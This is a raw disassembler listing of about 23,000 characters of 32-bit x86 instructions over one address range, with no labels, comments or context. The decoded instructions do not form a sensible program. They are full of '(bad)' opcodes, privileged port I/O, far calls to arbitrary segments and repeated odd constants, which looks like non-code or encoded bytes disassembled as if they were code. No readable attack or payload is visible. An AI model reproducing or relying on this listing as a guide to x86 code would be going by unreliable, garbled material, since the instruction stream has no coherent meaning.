  4330eb:	popa   
  4330ec:	or     eax,0x6fd68acd
  4330f1:	or     ebx,DWORD PTR [edx-0x5af2c537]
  4330f7:	mov    dl,dh
  4330f9:	or     bx,WORD PTR [edx+0x10133ac9]
  433100:	mov    DWORD PTR [ebx+0x1b],ecx
  433103:	into   
  433104:	popa   
  433105:	pop    ss
  433106:	sub    al,0x13
  433108:	outs   dx,BYTE PTR ds:[esi]
  433109:	or     eax,0xb858a75
  43310e:	call   0xd68a:0xcd0d3ac9
  433115:	outs   dx,DWORD PTR ds:[esi]
  433116:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  43311c:	call   0xcd0d:0x61ce1b4b
  433123:	mov    dl,dh
  433125:	outs   dx,DWORD PTR ds:[esi]
  433126:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  43312c:	call   0xcd13:0x61a8e85e
  433133:	imul   edx,DWORD PTR [edi],0x136ee2c6
  433139:	jne    0x433116
  43313b:	ror    BYTE PTR ds:0xb858a75,cl
  433141:	call   0xa8e8:0x5e343ac9
  433148:	popa   
  433149:	ror    BYTE PTR ds:0xed349e75,cl
  43314f:	popa   
  433150:	popa   
  433151:	popa   
  433152:	ror    BYTE PTR ds:0xdb0d9e75,cl
  433158:	cmc    
  433159:	push   0x72626161
  43315e:	bound  esp,QWORD PTR [ebp-0x18e31d8e]
  433164:	(bad)  
  433165:	or     eax,0xb857e75
  43316a:	call   0xa8e8:0x5e343ac9
  433171:	popa   
  433172:	pop    ss
  433173:	loop   0x433158
  433175:	bound  esp,QWORD PTR [edx+0x62]
  433178:	out    dx,al
  433179:	xchg   DWORD PTR ds:0xb858a75,ecx
  43317f:	call   0x62e3:0x130d3ac9
  433186:	bound  esp,QWORD PTR [edx+0x13]
  433189:	outs   dx,BYTE PTR ds:[esi]
  43318a:	push   0x61a8e85e
  43318f:	pop    ss
  433190:	loop   0x433175
  433192:	bound  esp,QWORD PTR [edx+0x62]
  433195:	or     eax,0x610dfb75
  43319a:	or     eax,0x6262e313
  43319f:	bound  esp,QWORD PTR [edi-0x788c2d26]
  4331a5:	or     eax,0x610dda75
  4331aa:	or     eax,0x13562ccd
  4331af:	jecxz  0x433213
  4331b1:	bound  esp,QWORD PTR [edx+0xd]
  4331b4:	in     al,0xe3
  4331b6:	bound  esp,QWORD PTR [edx+0x62]
  4331b9:	sbb    dl,BYTE PTR [ecx-0x116d79fc]
  4331bf:	sub    cl,BYTE PTR ds:0x610dda75
  4331c5:	or     eax,0x910ddacd
  4331ca:	push   esi
  4331cb:	cdq    
  4331cc:	xchg   esi,eax
  4331cd:	or     eax,0x6817fbcd
  4331d2:	or     eax,0x610dda75
  4331d7:	or     eax,0x910dfbcd
  4331dc:	push   esi
  4331dd:	(bad)  
  4331de:	std    
  4331df:	popa   
  4331e0:	popa   
  4331e1:	popa   
  4331e2:	pop    ss
  4331e3:	loop   0x4331c4
  4331e5:	bound  esp,QWORD PTR [edx+0x62]
  4331e8:	or     eax,0x610dda75
  4331ed:	or     eax,0x1f2d2ccd
  4331f2:	or     eax,0x681776cd
  4331f7:	or     eax,0x610dda75
  4331fc:	or     eax,0x910dfbcd
  433201:	push   esi
  433202:	cdq    
  433203:	cmp    BYTE PTR [edi],dl
  433205:	jne    0x433264
  433207:	or     eax,0xb857e75
  43320c:	call   0xa8e8:0x5e343ac9
  433213:	popa   
  433214:	pop    ss
  433215:	jne    0x43326c
  433217:	or     eax,0x6262dfe2
  43321c:	bound  ecx,QWORD PTR ds:0xe217f7a2
  433222:	out    0x62,eax
  433224:	bound  esp,QWORD PTR [edx-0x12]
  433227:	xchg   ebx,eax
  433228:	or     eax,0x6262dfe2
  43322d:	bound  ecx,QWORD PTR ds:0xe217f7a2
  433233:	out    0x62,eax
  433235:	bound  esp,QWORD PTR [edx+0xd]
  433238:	jne    0x4332b8
  43323a:	test   DWORD PTR [ebx],ecx
  43323c:	call   0xa8e8:0x5e343ac9
  433243:	popa   
  433244:	mov    eax,ds:0x6262e7e2
  433249:	bound  edx,QWORD PTR [ebx+0x6168726e]
  43324f:	popa   
  433250:	or     eax,0xb857e75
  433255:	call   0xa8e8:0x5e343ac9
  43325c:	popa   
  43325d:	pop    ss
  43325e:	loop   0x43324b
  433260:	bound  esp,QWORD PTR [edx+0x62]
  433263:	out    dx,al
  433264:	lea    ecx,ds:0x6262ebe2
  43326a:	bound  esp,QWORD PTR [edx+0x62ebe217]
  433270:	bound  esp,QWORD PTR [edx+0xd]
  433273:	loop   0x43325c
  433275:	bound  esp,QWORD PTR [edx+0x62]
  433278:	fdiv   st,st(3)
  43327a:	call   0x62eb:0xe2a1f34f
  433281:	bound  esp,QWORD PTR [edx-0x6d]
  433284:	fsub   DWORD PTR [edx]
  433286:	popa   
  433287:	popa   
  433288:	popa   
  433289:	or     eax,0x6262ebe2
  43328e:	bound  ecx,QWORD PTR ds:0x6262df13
  433294:	bound  edx,QWORD PTR [ebx-0x6566d30e]
  43329a:	or     eax,0x6fd68acd
  43329f:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4332a5:	pop    esi
  4332a6:	call   0x3f629453
  4332ab:	xchg   BYTE PTR ds:0x66d68aa5,cl
  4332b1:	or     ebx,DWORD PTR [edx+0x22d63ac9]
  4332b7:	pop    esi
  4332b8:	call   0x4e709465
  4332bd:	jg     0x4332de
  4332bf:	pop    ss
  4332c0:	loop   0x43333c
  4332c2:	bound  esp,QWORD PTR [edx+0x62]
  4332c5:	or     eax,0x6262ebe2
  4332ca:	bound  ecx,QWORD PTR ds:0x6262df13
  4332d0:	bound  edx,QWORD PTR [ebx-0x6566d30e]
  4332d6:	pop    ds
  4332d7:	imul   eax,DWORD PTR [esi+0x62e6e217],0xe20d6262
  4332e1:	out    0x62,al
  4332e3:	bound  esp,QWORD PTR [edx+0x33]
  4332e6:	pop    esi
  4332e7:	call   0xbc89494
  4332ec:	call   0x1e2:0x239d3ac9
  4332f3:	imul   esp,edi,0x6270f03a
  4332f9:	bound  esp,QWORD PTR [edx-0x12]
  4332fc:	ror    DWORD PTR ds:0x610dda75,1
  433302:	or     eax,0x6262df13
  433307:	bound  ecx,QWORD PTR ds:0x7a135691
  43330d:	bound  esp,QWORD PTR [edx+0x62]
  433310:	fcom   DWORD PTR [esi+0x72e7619a]
  433316:	or     eax,0x610dda75
  43331b:	or     eax,0x6262df13
  433320:	bound  ecx,QWORD PTR ds:0x7a135691
  433326:	bound  esp,QWORD PTR [edx+0x62]
  433329:	push   esi
  43332a:	pop    ds
  43332b:	pop    ss
  43332c:	loop   0x4332fc
  43332e:	bound  esp,QWORD PTR [edx+0x62]
  433331:	or     eax,0x610d7675
  433336:	or     eax,0x6262ce13
  43333b:	bound  edx,QWORD PTR [esi+0x68]
  43333e:	or     eax,0x6262ce13
  433343:	bound  edx,QWORD PTR [edi]
  433345:	push   0x626280f0
  43334a:	bound  ecx,QWORD PTR ds:0xe2565575
  433350:	out    0x62,eax
  433352:	bound  esp,QWORD PTR [edx+0x17]
  433355:	jne    0x4333ac
  433357:	or     eax,0xcd0d5575
  43335c:	sti    
  43335d:	or     eax,0x54d6a791
  433362:	popa   
  433363:	popa   
  433364:	popa   
  433365:	call   0xdcf21c9
  43336a:	loop   0x43334b
  43336c:	bound  esp,QWORD PTR [edx+0x62]
  43336f:	push   esi
  433370:	loop   0x433359
  433372:	bound  esp,QWORD PTR [edx+0x62]
  433375:	pop    ss
  433376:	loop   0x433357
  433378:	bound  esp,QWORD PTR [edx+0x62]
  43337b:	lock and al,0x63
  43337e:	bound  esp,QWORD PTR [edx+0xd]
  433381:	jne    0x43330d
  433383:	test   DWORD PTR [ebx],ecx
  433385:	call   0xd68a:0xcd0d3ac9
  43338c:	outs   dx,DWORD PTR ds:[esi]
  43338d:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  433393:	call   0xcd0d:0x61ce1b4b
  43339a:	mov    dl,dh
  43339c:	outs   dx,DWORD PTR ds:[esi]
  43339d:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  4333a3:	call   0xcd0d:0x61a8e85e
  4333aa:	mov    dl,dh
  4333ac:	outs   dx,DWORD PTR ds:[esi]
  4333ad:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  4333b3:	call   0x7517:0x61a8e85e
  4333ba:	fisttp DWORD PTR ds:0xcd0d2c75
  4333c0:	jle    0x433398
  4333c2:	outs   dx,DWORD PTR ds:[esi]
  4333c3:	or     ebx,DWORD PTR [edx+0x6e173ac9]
  4333c9:	adc    ebp,ebx
  4333cb:	dec    ebp
  4333cc:	push   edi
  4333cd:	popa   
  4333ce:	or     eax,0x610dfb75
  4333d3:	or     eax,0x6fd68acd
  4333d8:	or     ebx,DWORD PTR [edx-0x5df2c537]
  4333de:	rcl    BYTE PTR [edi],cl
  4333e0:	outs   dx,BYTE PTR ds:[esi]
  4333e1:	adc    ebp,ebx
  4333e3:	dec    ebp
  4333e4:	push   edi
  4333e5:	popa   
  4333e6:	or     eax,0xb85a675
  4333eb:	call   0xa8e8:0x5e343ac9
  4333f2:	popa   
  4333f3:	or     eax,0x6fd68acd
  4333f8:	or     ebx,DWORD PTR [edx-0x5af2c537]
  4333fe:	mov    dl,dh
  433400:	or     bx,WORD PTR [edx+0x10133ac9]
  433407:	mov    DWORD PTR [ebx+0x1b],ecx
  43340a:	into   
  43340b:	popa   
  43340c:	pop    ss
  43340d:	sub    al,0x13
  43340f:	outs   dx,BYTE PTR ds:[esi]
  433410:	or     eax,0xb858a75
  433415:	call   0xd68a:0xcd0d3ac9
  43341c:	outs   dx,DWORD PTR ds:[esi]
  43341d:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  433423:	call   0xcd0d:0x61ce1b4b
  43342a:	mov    dl,dh
  43342c:	outs   dx,DWORD PTR ds:[esi]
  43342d:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  433433:	call   0xcd13:0x61a8e85e
  43343a:	imul   edx,DWORD PTR [edi],0x136ee2c6
  433440:	jne    0x43341d
  433442:	ror    BYTE PTR ds:0xb858a75,cl
  433448:	call   0xa8e8:0x5e343ac9
  43344f:	popa   
  433450:	ror    BYTE PTR ds:0xed349e75,cl
  433456:	popa   
  433457:	popa   
  433458:	popa   
  433459:	ror    BYTE PTR ds:0xdb0d9e75,cl
  43345f:	cmc    
  433460:	push   0x72626161
  433465:	bound  esp,QWORD PTR [ebp-0x618af28e]
  43346b:	or     eax,0x6168dbdb
  433470:	popa   
  433471:	pop    ss
  433472:	jne    0x4334c0
  433474:	or     eax,0x610d7675
  433479:	push   esi
  43347a:	jne    0x4334c8
  43347c:	pop    ss
  43347d:	jne    0x4334cb
  43347f:	or     eax,0xcd0d4c75
  433484:	jbe    0x433493
  433486:	xchg   ecx,eax
  433487:	pop    ss
  433488:	call   0x2c22:0x575d750d
  43348f:	popa   
  433490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433491:	or     eax,0x13c9c964
  433496:	jne    0x4334ed
  433498:	pop    ss
  433499:	jne    0x433504
  43349b:	or     eax,0x61216975
  4334a0:	push   edx
  4334a1:	sub    dl,dh
  4334a3:	imul   edx,esi,0x2a5255ea
  4334a9:	(bad)  
  4334aa:	imul   esi,DWORD PTR [edx-0x6d8af274],0xe090a2ff
  4334b4:	or     eax,0xa2ff8675
  4334b9:	call   0xa2ff:0x86750d60
  4334c0:	nop
  4334c1:	loopne 0x4334d0
  4334c3:	jne    0x433457
  4334c5:	jmp    DWORD PTR [edx+0x22571b5f]
  4334cb:	xchg   BYTE PTR [ecx-0x5b],ah
  4334ce:	or     eax,0x750dc964
  4334d3:	jbe    0x4334e2
  4334d5:	fisttp DWORD PTR [eax+ebp*2]
  4334d8:	popa   
  4334d9:	popa   
  4334da:	or     eax,0x55751761
  4334df:	or     eax,0xb859a75
  4334e4:	call   0xa8e8:0x5e343ac9
  4334eb:	popa   
  4334ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4334ed:	jne    0x433481
  4334ef:	mov    dl,0x7e
  4334f1:	clc    
  4334f2:	pushf  
  4334f3:	xchg   BYTE PTR [edx-0x11a872aa],dh
  4334f9:	mov    edi,0x869cf698
  4334fe:	mov    dl,0x56
  433500:	lock out dx,eax
  433502:	popa   
  433503:	popa   
  433504:	popa   
  433505:	or     eax,0x610d7e75
  43350a:	or     eax,0x6fd69acd
  43350f:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433515:	pop    esi
  433516:	call   0x1fea96c3
  43351b:	out    0x80,eax
  43351d:	bound  esi,QWORD PTR [edx-0x754d9d8a]
  433523:	bound  esi,QWORD PTR [edx+0x7e750d55]
  433529:	bound  esi,QWORD PTR [edx-0xd]
  43352c:	test   eax,0xd626265
  433531:	int    0x7e
  433533:	pop    ss
  433534:	push   0x750dceee
  433539:	call   0x343a:0xc99a0b85
  433540:	pop    esi
  433541:	call   0xcd5096ee
  433546:	xchg   dh,dl
  433548:	outs   dx,DWORD PTR ds:[esi]
  433549:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  43354f:	pop    esi
  433550:	call   0x1fea96fd
  433555:	mov    dl,0x88
  433557:	clc    
  433558:	inc    edi
  433559:	xor    ecx,esi
  43355b:	fsubr  st(5),st
  43355d:	sbb    al,0xed
  43355f:	push   ebp
  433560:	imul   ecx,DWORD PTR [ecx],0xfffffff6
  433563:	inc    edi
  433564:	xor    ecx,esi
  433566:	fsub   st(6),st
  433568:	test   al,0xd
  43356a:	jne    0x433506
  43356c:	test   DWORD PTR [ebx],ecx
  43356e:	call   0xa8e8:0x5e343ac9
  433575:	popa   
  433576:	mov    eax,ds:0x89e75575
  43357b:	clc    
  43357c:	mov    eax,ds:0x3393b57c
  433581:	and    ecx,esi
  433583:	(bad)  
  433584:	jmp    0x43357c
  433586:	mov    eax,ds:0xee93b57c
  43358b:	xchg   ebx,eax
  43358c:	clc    
  43358d:	inc    edi
  43358e:	addr16 lahf 
  433590:	scas   eax,DWORD PTR es:[edi]
  433591:	aad    0x9c
  433593:	fs xchg ebp,eax
  433595:	enter  0x47f6,0x67
  433599:	lahf   
  43359a:	scas   eax,DWORD PTR es:[edi]
  43359b:	push   edi
  43359c:	and    cl,BYTE PTR [edx+0x640da561]
  4335a2:	fsub   DWORD PTR [esi+eax*4+0xd]
  4335a6:	jne    0x433542
  4335a8:	test   DWORD PTR [ebx],ecx
  4335aa:	call   0xa8e8:0x5e343ac9
  4335b1:	popa   
  4335b2:	or     eax,0x681792cd
  4335b7:	or     eax,0xdb0d8a75
  4335bc:	jmp    0xda49729
  4335c1:	int    0x8a
  4335c3:	or     eax,0x6168e917
  4335c8:	popa   
  4335c9:	or     eax,0x56610d91
  4335ce:	cdq    
  4335cf:	xchg   esi,eax
  4335d0:	pop    ss
  4335d1:	jne    0x433630
  4335d3:	or     eax,0xdb0d8a75
  4335d8:	dec    eax
  4335d9:	push   0xa20d6161
  4335de:	jle    0x4335f7
  4335e0:	jne    0x43364b
  4335e2:	jo     0x4335db
  4335e4:	jp     0x433647
  4335e6:	jb     0x433649
  4335e8:	popa   
  4335e9:	or     eax,0xeb625d75
  4335ee:	shl    BYTE PTR [eax+0x61],cl
  4335f1:	bound  esp,QWORD PTR [ebp+0x7ecd0d69]
  4335f7:	pop    ss
  4335f8:	push   0x859a750d
  4335fd:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  433603:	call   0x755a97b0
  433608:	push   ebp
  433609:	bound  esi,QWORD PTR [edx+0x5575138a]
  43360f:	shl    BYTE PTR [edx-0x4e],cl
  433612:	jle    0x433676
  433614:	mov    dl,0x92
  433616:	bound  esi,QWORD PTR [edx-0x654d9d7a]
  43361c:	repz mov cl,0x63
  43361f:	bound  esp,QWORD PTR [edx+0xd]
  433622:	jne    0x4336a2
  433624:	or     eax,0x9acd0d61
  433629:	(bad)  
  43362a:	outs   dx,DWORD PTR ds:[esi]
  43362b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433631:	pop    esi
  433632:	call   0x1fea97df
  433637:	out    0x6a,eax
  433639:	or     eax,0xb858675
  43363e:	call   0xa8e8:0x5e343ac9
  433645:	popa   
  433646:	xchg   ebx,eax
  433647:	mov    edx,0xcd0d5575
  43364c:	xchg   edx,eax
  43364d:	pop    ss
  43364e:	push   0x617e2257
  433653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433654:	or     eax,0x9264d864
  433659:	and    DWORD PTR [ebp+0x5d],esi
  43365c:	lods   eax,DWORD PTR ds:[esi]
  43365d:	loop   0x433660
  43365f:	imul   esp,DWORD PTR [ecx],0xe2253175
  433665:	add    DWORD PTR [ecx+0xd],ebp
  433668:	jne    0x4336c7
  43366a:	test   DWORD PTR [ebx],ecx
  43366c:	call   0xa8e8:0x5e343ac9
  433673:	popa   
  433674:	pop    ss
  433675:	jne    0x4336cc
  433677:	or     eax,0x75178675
  43367c:	imul   edi,DWORD PTR [edx-0x53],0x626901e2
  433683:	mov    dl,0x69
  433685:	bound  esi,QWORD PTR [edx+0x5575139a]
  43368b:	shl    BYTE PTR [edx-0x4e],cl
  43368e:	imul   esp,DWORD PTR [edx-0x4e],0x5db26231
  433695:	repz fbld TBYTE PTR [ecx+0x61]
  433699:	popa   
  43369a:	pop    ss
  43369b:	jne    0x4336f2
  43369d:	or     eax,0x22575575
  4336a2:	xchg   BYTE PTR [ecx-0x5b],ah
  4336a5:	or     eax,0x92b26264
  4336aa:	bound  esi,QWORD PTR [edx-0x685e857a]
  4336b0:	mov    ah,0x69
  4336b2:	repz out 0x6f,eax
  4336b5:	bound  esp,QWORD PTR [edx+0xd]
  4336b8:	jne    0x433640
  4336ba:	jmp    DWORD PTR [ecx+0x50]
  4336bd:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  4336c3:	jp     0x43370e
  4336c5:	pop    edx
  4336c6:	loop   0x433731
  4336c8:	repz pop edx
  4336ca:	dec    edx
  4336cb:	bound  esp,QWORD PTR [edx+0xd]
  4336ce:	jne    0x433656
  4336d0:	jmp    DWORD PTR [edx-0x4d9d9bcc]
  4336d6:	xchg   edx,eax
  4336d7:	bound  esi,QWORD PTR [edx-0x11aa857a]
  4336dd:	loop   0x433748
  4336df:	repz pop es
  4336e1:	push   0x750d6161
  4336e6:	xchg   bh,bh
  4336e8:	mov    ds:0xb262f33b,al
  4336ed:	xchg   edx,eax
  4336ee:	bound  esi,QWORD PTR [edx-0x59b8857a]
  4336f4:	mov    ah,0x69
  4336f6:	repz retf 
  4336f8:	and    DWORD PTR [edx+0x62],esp
  4336fb:	or     eax,0xa2ff8675
  433700:	pop    edi
  433701:	sbb    esp,DWORD PTR [edx-0x4e]
  433704:	xchg   edx,eax
  433705:	bound  esi,QWORD PTR [edx-0x119f857a]
  43370b:	sar    BYTE PTR [edx],cl
  43370d:	repz fstp QWORD PTR [edx+eiz*2+0x62]
  433712:	mov    ebp,0xa5618622
  433717:	or     eax,0xfbead664
  43371c:	lods   eax,DWORD PTR ds:[esi]
  43371d:	loop   0x433720
  43371f:	imul   esi,DWORD PTR [edx-0x1dda852c],0xb2626901
  433729:	jbe    0x43378d
  43372b:	mov    dl,0x8a
  43372d:	bound  esi,QWORD PTR [edx-0x6d4d9d82]
  433733:	bound  esi,QWORD PTR [edx-0x654d9d7a]
  433739:	repz push eax
  43373b:	bound  esp,QWORD PTR [edx+0x62]
  43373e:	or     eax,0x68177ecd
  433743:	lock test eax,0xd6616168
  433749:	jmp    0xb269:0x1e225fb
  433750:	aam    0x7a
  433752:	mov    bl,0xe2
  433754:	add    DWORD PTR [ecx+0x62],ebp
  433757:	mov    dl,0x76
  433759:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  43375f:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  433765:	bound  esi,QWORD PTR [edx+0x62b0f39a]
  43376b:	bound  esp,QWORD PTR [edx+0xd]
  43376e:	int    0x7e
  433770:	pop    ss
  433771:	push   0x61685ff0
  433776:	popa   
  433777:	(bad)  
  433778:	jmp    0xb269:0x1e2b3fb
  43377f:	aam    0x7a
  433781:	and    esp,edx
  433783:	add    DWORD PTR [ecx+0x62],ebp
  433786:	mov    dl,0x76
  433788:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  43378e:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  433794:	bound  esi,QWORD PTR [edx+0x62e1f39a]
  43379a:	bound  esp,QWORD PTR [edx+0xd]
  43379d:	int    0x7e
  43379f:	pop    ss
  4337a0:	push   0x616145f0
  4337a5:	popa   
  4337a6:	(bad)  
  4337a7:	jmp    0xb269:0x1e223fb
  4337ae:	aam    0x7a
  4337b0:	and    dl,ah
  4337b2:	add    DWORD PTR [ecx+0x62],ebp
  4337b5:	mov    dl,0x76
  4337b7:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  4337bd:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  4337c3:	bound  esi,QWORD PTR [edx+0x62d7f39a]
  4337c9:	bound  esp,QWORD PTR [edx+0xd]
  4337cc:	int    0x7e
  4337ce:	pop    ss
  4337cf:	push   0x616154f0
  4337d4:	popa   
  4337d5:	(bad)  
  4337d6:	jmp    0xb269:0x1e227fb
  4337dd:	and    DWORD PTR [edx-0x4e],0x7eb26292
  4337e4:	bound  esi,QWORD PTR [edx-0x794d9d76]
  4337ea:	bound  esi,QWORD PTR [edx+0x5cacf39a]
  4337f0:	bound  esp,QWORD PTR [edx-0x10]
  4337f3:	fldenv [ecx+0x61]
  4337f6:	popa   
  4337f7:	(bad)  
  4337f8:	jmp    0xb269:0x1e220fb
  4337ff:	jg     0x43387b
  433801:	sub    edx,esp
  433803:	add    DWORD PTR [ecx+0x62],ebp
  433806:	mov    dl,0x76
  433808:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  43380e:	bound  esi,QWORD PTR [edx-0x794d9d6e]
  433814:	bound  esi,QWORD PTR [edx+0x6367f39a]
  43381a:	bound  esp,QWORD PTR [edx+0xd]
  43381d:	int    0x7e
  43381f:	pop    ss
  433820:	push   0xead6a4ee
  433825:	sti    
  433826:	sub    edx,esp
  433828:	add    DWORD PTR [ecx-0x4e],ebp
  43382b:	jg     0x4338a7
  43382d:	push   ds
  43382e:	loop   0x433831
  433830:	imul   esp,DWORD PTR [edx-0x4e],0x8ab26276
  433837:	bound  esi,QWORD PTR [edx-0x6d4d9d82]
  43383d:	bound  esi,QWORD PTR [edx-0x654d9d7a]
  433843:	repz push edx
  433845:	arpl   WORD PTR [edx+0x62],sp
  433848:	or     eax,0x68177ecd
  43384d:	out    dx,al
  43384e:	cs (bad) 
  433850:	jmp    0xb269:0x1e21efb
  433857:	jns    0x4338d3
  433859:	daa    
  43385a:	loop   0x43385d
  43385c:	imul   esp,DWORD PTR [edx-0x4e],0x8ab26276
  433863:	bound  esi,QWORD PTR [edx-0x6d4d9d82]
  433869:	bound  esi,QWORD PTR [edx-0x654d9d7a]
  43386f:	repz add esp,DWORD PTR [ebx+0x62]
  433873:	bound  ecx,QWORD PTR ds:0x68177ecd
  433879:	or     eax,0x610d7e75
  43387e:	mov    ebp,0xa5617622
  433883:	or     eax,0x13c9c964
  433888:	jne    0x4338df
  43388a:	pop    ss
  43388b:	jne    0x4338f6
  43388d:	or     eax,0x61216975
  433892:	push   edx
  433893:	ds dec eax
  433895:	cmp    dl,dh
  433897:	jmp    0xb23a:0x483e5255
  43389e:	cmp    cl,BYTE PTR ds:0xa2ff9275
  4338a4:	cmp    bh,ch
  4338a6:	or     eax,0xa2ff9275
  4338ab:	push   0x86750d36
  4338b0:	jmp    DWORD PTR [edx+0x22575991]
  4338b6:	xchg   BYTE PTR [ecx-0x5b],ah
  4338b9:	or     eax,0x21c9c964
  4338be:	jne    0x433929
  4338c0:	lods   eax,DWORD PTR ds:[esi]
  4338c1:	pop    ebx
  4338c2:	add    DWORD PTR [ecx+0xd],ebp
  4338c5:	jne    0x43384d
  4338c7:	or     eax,0x6168e9db
  4338cc:	popa   
  4338cd:	or     eax,0x910d9acd
  4338d2:	pop    ss
  4338d3:	call   0xe9db:0xd86750d
  4338da:	push   0xcd0d6161
  4338df:	xchg   BYTE PTR ds:0x61680c17,cl
  4338e5:	popa   
  4338e6:	or     eax,0xd681761
  4338eb:	jne    0x433873
  4338ed:	or     eax,0x6168e9db
  4338f2:	popa   
  4338f3:	or     eax,0x170d86cd
  4338f8:	jmp    0xda49a65
  4338fd:	xchg   ecx,eax
  4338fe:	or     eax,0x96995661
  433903:	pop    ss
  433904:	jne    0x43395b
  433906:	or     eax,0xf2935575
  43390b:	mov    ds:0x69cd0d6a,al
  433910:	(bad)  
  433911:	outs   dx,DWORD PTR ds:[esi]
  433912:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433918:	pop    esi
  433919:	call   0x1fc29ac6
  43391e:	out    0x93,eax
  433920:	or     eax,0xdb0d8675
  433925:	pusha  
  433926:	push   0x61216161
  43392b:	and    eax,0x576901e2
  433930:	and    bl,BYTE PTR [edx+0x640da561]
  433936:	fsub   DWORD PTR [esi+edx*4+0x21]
  43393a:	jne    0x4339a5
  43393c:	lods   eax,DWORD PTR ds:[esi]
  43393d:	or     eax,DWORD PTR [ecx]
  43393f:	imul   esp,DWORD PTR [ecx],0xe2315575
  433945:	add    DWORD PTR [ecx+0x21],ebp
  433948:	jne    0x433992
  43394a:	and    dl,ah
  43394c:	add    DWORD PTR [ecx+0x21],ebp
  43394f:	jne    0x433982
  433951:	mov    bl,0xe2
  433953:	add    DWORD PTR [ecx+0x21],ebp
  433956:	jne    0x4339b5
  433958:	lods   eax,DWORD PTR ds:[esi]
  433959:	xor    al,0x9
  43395b:	imul   edx,DWORD PTR [ebx],0x7517f775
  433961:	cmp    al,0xd
  433963:	jne    0x4338f3
  433965:	or     eax,0x6168e9db
  43396a:	popa   
  43396b:	pop    ss
  43396c:	jne    0x433986
  43396e:	or     eax,0xdb0d8e75
  433973:	or     al,0x68
  433975:	popa   
  433976:	popa   
  433977:	pop    ss
  433978:	jne    0x4339ca
  43397a:	or     eax,0xdb0d8e75
  43397f:	adc    BYTE PTR [eax+0x61],ch
  433982:	popa   
  433983:	pop    ss
  433984:	jne    0x433979
  433986:	or     eax,0x610df375
  43398b:	or     eax,0x6fd686cd
  433990:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  433996:	pop    esi
  433997:	call   0x1fea9b44
  43399c:	mov    dl,0x97
  43399e:	bound  esi,QWORD PTR [edx-0x44d9d72]
  4339a4:	repz xchg ebx,eax
  4339a6:	bound  esp,QWORD PTR [edx+0x62]
  4339a9:	or     eax,0x610d5075
  4339ae:	or     eax,0x910d50cd
  4339b3:	push   esi
  4339b4:	cdq    
  4339b5:	xchg   esi,eax
  4339b6:	pop    ss
  4339b7:	jne    0x433a1d
  4339b9:	or     eax,0xb858675
  4339be:	call   0xa8e8:0x5e343ac9
  4339c5:	popa   
  4339c6:	or     eax,0x68a7f3cd
  4339cb:	xchg   ebx,eax
  4339cc:	loop   0x433a1d
  4339ce:	popa   
  4339cf:	popa   
  4339d0:	popa   
  4339d1:	or     eax,0x610d1875
  4339d6:	pop    ss
  4339d7:	jne    0x433a31
  4339d9:	adc    esi,DWORD PTR [ebp+0x28]
  4339dc:	shl    BYTE PTR [edx-0x4e],cl
  4339df:	pop    eax
  4339e0:	bound  esi,QWORD PTR [edx+0x50b262f3]
  4339e6:	bound  esi,QWORD PTR [edx-0x714d9de8]
  4339ec:	bound  esi,QWORD PTR [edx+0x55b26292]
  4339f2:	bound  esi,QWORD PTR [edx+0x69b26231]
  4339f8:	adc    esi,DWORD PTR [ebp+0x64]
  4339fb:	rcl    BYTE PTR [ebx],cl
  4339fd:	jne    0x433a4b
  4339ff:	shl    BYTE PTR [edx-0x4e],cl
  433a02:	call   0x76b2:0x6286b262
  433a09:	bound  esi,QWORD PTR [edx+0x7eb2628a]
  433a0f:	repz (bad) 
  433a11:	pop    ebp
  433a12:	bound  esp,QWORD PTR [edx+0x17]
  433a15:	jne    0x433a77
  433a17:	bound  esi,QWORD PTR [edx-0x754d9d8a]
  433a1d:	bound  esi,QWORD PTR [edx+0x60750d28]
  433a23:	bound  ebx,QWORD PTR [eax+0x13]
  433a26:	jne    0x433a1f
  433a28:	pop    ss
  433a29:	jne    0x433a67
  433a2b:	or     eax,0x75568e75
  433a30:	dec    esp
  433a31:	pop    ss
  433a32:	jne    0x4339c2
  433a34:	or     eax,0xdb0d8e75
  433a39:	jmp    0x17a49ba6
  433a3e:	jne    0x433a58
  433a40:	or     eax,0xdb0d8e75
  433a45:	or     al,0x68
  433a47:	popa   
  433a48:	popa   
  433a49:	pop    ss
  433a4a:	jne    0x433a9c
  433a4c:	or     eax,0xdb0d8e75
  433a51:	adc    BYTE PTR [eax+0x61],ch
  433a54:	popa   
  433a55:	pop    ss
  433a56:	jne    0x433a4b
  433a58:	or     eax,0x610df375
  433a5d:	or     eax,0x68a13ccd
  433a62:	call   0xf3b84808
  433a67:	or     eax,0x50cd0d61
  433a6c:	or     eax,0x50a50d91
  433a71:	or     eax,0x96c80d88
  433a76:	push   esi
  433a77:	sub    al,0x89
  433a79:	ror    BYTE PTR ds:0x68a13ccd,cl
  433a7f:	jae    0x433af7
  433a81:	or     eax,0x75173c75
  433a86:	stc    
  433a87:	or     eax,0x610d5075
  433a8c:	or     eax,0x910df3cd
  433a91:	sub    eax,0xf9cd0d1f
  433a96:	push   esi
  433a97:	push   0x17f9cd0d
  433a9c:	push   0xee4c750d
  433aa1:	lea    ecx,ds:0xb858675
  433aa7:	call   0xa8e8:0x5e343ac9
  433aae:	popa   
  433aaf:	push   edi
  433ab0:	and    bh,bl
  433ab2:	popa   
  433ab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433ab4:	or     eax,0xa264d864
